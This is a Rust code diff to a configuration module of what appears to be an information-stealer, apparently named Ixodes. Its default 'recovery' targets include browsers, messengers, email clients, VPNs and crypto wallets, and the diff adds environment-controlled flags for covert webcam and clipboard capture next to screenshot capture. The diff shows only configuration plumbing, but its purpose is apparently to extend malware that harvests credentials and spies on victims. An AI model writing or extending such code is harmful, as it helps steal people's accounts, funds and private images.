@@ -4,9 +4,20 @@ use once_cell::sync::Lazy;
 use std::{collections::HashSet, env, str::FromStr};
 use tracing::{info, warn};
 
-static DEFAULT_ALLOWED_CATEGORIES: Option<&[RecoveryCategory]> = Some(&[RecoveryCategory::Browsers, RecoveryCategory::Messengers, RecoveryCategory::Gaming, RecoveryCategory::EmailClients, RecoveryCategory::VPNs, RecoveryCategory::Wallets, RecoveryCategory::System, RecoveryCategory::Other]);
+static DEFAULT_ALLOWED_CATEGORIES: Option<&[RecoveryCategory]> = Some(&[
+    RecoveryCategory::Browsers,
+    RecoveryCategory::Messengers,
+    RecoveryCategory::Gaming,
+    RecoveryCategory::EmailClients,
+    RecoveryCategory::VPNs,
+    RecoveryCategory::Wallets,
+    RecoveryCategory::System,
+    RecoveryCategory::Other,
+]);
 static DEFAULT_ARTIFACT_KEY: Option<&str> = None;
 static DEFAULT_CAPTURE_SCREENSHOTS: bool = false;
+static DEFAULT_CAPTURE_WEBCAMS: bool = false;
+static DEFAULT_CAPTURE_CLIPBOARD: bool = false;
 
 static GLOBAL_RECOVERY_CONTROL: Lazy<RecoveryControl> = Lazy::new(RecoveryControl::from_env);
 
@@ -15,6 +26,8 @@ pub struct RecoveryControl {
     allowed_categories: Option<HashSet<RecoveryCategory>>,
     artifact_key: Option<Vec<u8>>,
     capture_screenshots: bool,
+    capture_webcams: bool,
+    capture_clipboard: bool,
 }
 
 impl RecoveryControl {
@@ -35,6 +48,14 @@ impl RecoveryControl {
 
     pub fn capture_screenshots(&self) -> bool {
         self.capture_screenshots
+    }
+
+    pub fn capture_webcams(&self) -> bool {
+        self.capture_webcams
+    }
+
+    pub fn capture_clipboard(&self) -> bool {
+        self.capture_clipboard
     }
 
     fn from_env() -> Self {
@@ -65,11 +86,17 @@ impl RecoveryControl {
 
         let capture_screenshots =
             parse_flag("IXODES_CAPTURE_SCREENSHOTS").unwrap_or(DEFAULT_CAPTURE_SCREENSHOTS);
+        let capture_webcams =
+            parse_flag("IXODES_CAPTURE_WEBCAM").unwrap_or(DEFAULT_CAPTURE_WEBCAMS);
+        let capture_clipboard =
+            parse_flag("IXODES_CAPTURE_CLIPBOARD").unwrap_or(DEFAULT_CAPTURE_CLIPBOARD);
 
         RecoveryControl {
             allowed_categories,
             artifact_key,
             capture_screenshots,
+            capture_webcams,
+            capture_clipboard,
         }
     }
 }
